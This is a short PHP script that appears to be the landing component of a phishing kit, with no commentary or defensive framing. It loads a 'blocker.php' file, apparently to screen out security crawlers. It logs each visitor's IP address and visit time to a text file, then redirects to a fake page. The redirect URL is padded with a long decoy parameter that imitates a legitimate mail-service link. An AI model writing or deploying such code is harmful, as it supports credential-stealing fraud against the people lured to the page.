<?php
include('blocker.php');

$file = fopen("click.txt", "a");
$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
fputs ($file, "$adddate\r\n");
fputs ($file, "$ip\r\n");
fputs ($file, "-----------------------------------\r\n");
fclose ($file);

header("Location: adapter2adapter.ping.html?SDAN=MSs22djpHh2DSWF5LcCk6zGJIvbAAMkADcyMWNlOGU4LTA1MTctNGU5NC04NmVhLTM2ZjY2MWQ1ODUyZQAuAAAAAACPL3Vd8cnLS4%2FrNHDvh%2BurAQDLxtTRqKyYQrNPEBhBv0F3AAAMdHa7AAA_938945743421MTctNGU5NC04NmVhLTM2ZjY2MW1MTctNGU5NC04NmVhLTM2ZjY2MW");
?>